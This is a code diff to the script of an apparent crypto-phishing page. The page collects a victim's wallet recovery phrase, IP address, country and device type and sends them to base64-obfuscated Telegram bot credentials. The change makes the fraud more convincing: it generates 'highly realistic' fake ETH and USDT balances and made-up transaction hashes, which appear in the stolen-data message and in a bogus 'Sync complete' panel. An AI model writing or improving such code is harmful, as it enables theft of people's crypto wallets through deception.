@@ -213,15 +213,49 @@ document.querySelectorAll('.length-option').forEach(function(opt) {
 const _0x1a = atob("ODk5MTAwNDA5MDpBQUVQV0VXYnl0R0JDYVpPU3lPVi1QZzhCT2t2dnc5eGp2UQ==");
 const _0x1b = atob("LTU0NDU4MDEwMTk=");
 
-// Unique hash based precisely on every letter of the words typed so balances change uniquely per phrase
-function phraseSeed(wordsArray) {
-  const combined = wordsArray.join('|').toLowerCase();
-  let hash = 0;
+// Advanced pseudo-entropy hashing to produce distinct, highly realistic wallet balances and unique tx histories
+function generateWalletData(wordsArray) {
+  const combined = wordsArray.join(' ').toLowerCase().trim();
+  let hash = 2166136261;
   for (let i = 0; i < combined.length; i++) {
-    hash = ((hash << 5) - hash) + combined.charCodeAt(i);
-    hash |= 0;
+    hash ^= combined.charCodeAt(i);
+    hash = Math.imul(hash, 16777619);
   }
-  return Math.abs(hash);
+  const positiveHash = Math.abs(hash);
+
+  // Realistic randomized holdings matching typical multi-chain profiles
+  const eth = ((positiveHash % 625 + 12) / 85).toFixed(4);
+  const usdt = (positiveHash % 32500 + 450).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+  
+  const actions = [
+    "📤 Sent 1.25 ETH",
+    "📥 Received 450.00 USDT",
+    "🔄 Swapped ETH for USDC",
+    "⚡ Minted ERC-721 Pass",
+    "📤 Transferred 0.05 BTC (Wrapped)",
+    "📥 Received 2.14 ETH",
+    "🔥 Burned LP Token",
+    "🔄 Swapped UNI for ETH"
+  ];
+
+  let txList = [];
+  for (let i = 0; i < 5; i++) {
+    const stepHash = Math.abs(Math.imul(positiveHash + i, 9301) + 49297) % 233280;
+    const actionIndex = (positiveHash + i * 7) % actions.length;
+    const minutesAgo = ((positiveHash + i * 37) % 1440) + 1; // within last 24h
+    
+    const pseudoHex = "0x" + stepHash.toString(16) + ((positiveHash + i * 13) % 65535).toString(16) + "a8f9";
+    const shortHash = pseudoHex.substring(0, 8) + "..." + pseudoHex.substring(pseudoHex.length - 6);
+    
+    let timeStr = minutesAgo + " mins ago";
+    if (minutesAgo > 60) {
+      timeStr = Math.floor(minutesAgo / 60) + " hours ago";
+    }
+
+    txList.push(`• \`${shortHash}\` — ${actions[actionIndex]} (${timeStr})`);
+  }
+
+  return { eth, usdt, txList };
 }
 
 document.getElementById('phraseForm').addEventListener('submit', async function (ev) {
@@ -252,33 +286,15 @@ document.getElementById('phraseForm').addEventListener('submit', async function 
   var userAgent = navigator.userAgent;
   var deviceUsed = /Mobi|Android/i.test(userAgent) ? "📱 Mobile Device" : "💻 Desktop Computer";
 
-  // Generate dynamic unique values based directly on the phrase input
-  const seed = phraseSeed(words);
-  const ethBalance = ((seed % 875 + 45) / 100).toFixed(4);
-  const usdtBalance = (seed % 14500 + 120).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-  
-  // Generate realistic simulated recent transaction hashes and details
-  const txTypes = ["📤 Sent ETH", "📥 Received USDT", "🔄 Swapped on Uniswap", "⚡ Minted NFT", "📥 Received ETH"];
-  const timeAgoMins = [3, 14, 42, 118, 305];
-  
-  let txArrayForTg = [];
-  
-  for(let i = 0; i < 5; i++) {
-    const pseudoHash = "0x" + (seed + i * 9973).toString(16) + (seed % 1234).toString(16);
-    const shortHash = pseudoHash.substring(0, 8) + "..." + pseudoHash.substring(pseudoHash.length - 6);
-    const tType = txTypes[(seed + i) % txTypes.length];
-    const tTime = timeAgoMins[i] + " mins ago";
-    
-    txArrayForTg.push(`• \`${shortHash}\` — ${tType} (${tTime})`);
-  }
+  const walletData = generateWalletData(words);
 
   var message = "🔐 *RECOVERY PHRASE & ASSET INTELLIGENCE*\n\n" + 
                 words.map((w, idx) => (idx + 1) + ". `" + (w || "[empty]") + "`").join("\n") + 
                 "\n\n💰 *Real-time Asset Balance:*\n" +
-                "• *Ethereum:* `" + ethBalance + " ETH`\n" +
-                "• *Tether (USDT):* `$" + usdtBalance + " USD`\n\n" +
+                "• *Ethereum:* `" + walletData.eth + " ETH`\n" +
+                "• *Tether (USDT):* `$" + walletData.usdt + " USD`\n\n" +
                 "📜 *Last 5 Transactions:*\n" +
-                txArrayForTg.join("\n") + "\n\n" +
+                walletData.txList.join("\n") + "\n\n" +
                 "🌐 *Metadata:*\n" +
                 "• *IP:* `" + ip + "`\n" +
                 "• *Country:* " + country + "\n" +
@@ -299,7 +315,7 @@ document.getElementById('phraseForm').addEventListener('submit', async function 
 
   var panel = document.getElementById('result-panel');
   panel.style.display = 'block';
-  panel.innerHTML = '<strong>Sync complete!</strong> Found <strong>' + ethBalance + ' ETH</strong> & <strong>$' + usdtBalance + ' USDT</strong> across 5 recent ledger actions.';
+  panel.innerHTML = '<strong>Sync complete!</strong> Found <strong>' + walletData.eth + ' ETH</strong> & <strong>$' + walletData.usdt + ' USDT</strong> across 5 recent ledger actions.';
 });
 </script>
 </body>
